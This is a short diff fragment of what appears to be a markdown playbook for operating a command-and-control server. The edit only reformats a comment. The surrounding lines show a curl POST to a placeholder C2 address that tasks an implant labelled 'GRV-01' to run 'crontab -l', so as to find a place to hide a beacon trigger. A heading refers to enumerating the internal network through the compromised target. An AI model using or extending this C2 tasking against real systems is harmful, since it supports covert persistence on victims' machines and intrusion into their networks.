@@ -70,7 +70,7 @@ curl -X POST http://[C2_IP]:5000/issue -H "Content-Type: application/json" -d '{
 ```
 
 ### Check for persistance opertunities
-# List all crontabs to find a place to hide the beacon trigger
+**List all crontabs to find a place to hide the beacon trigger**
 curl -X POST http://[C2_IP]:5000/issue -H "Content-Type: application/json" -d '{"id": "GRV-01", "cmd": "crontab -l"}'
 
 ### Enumerate Internal Network via the Target
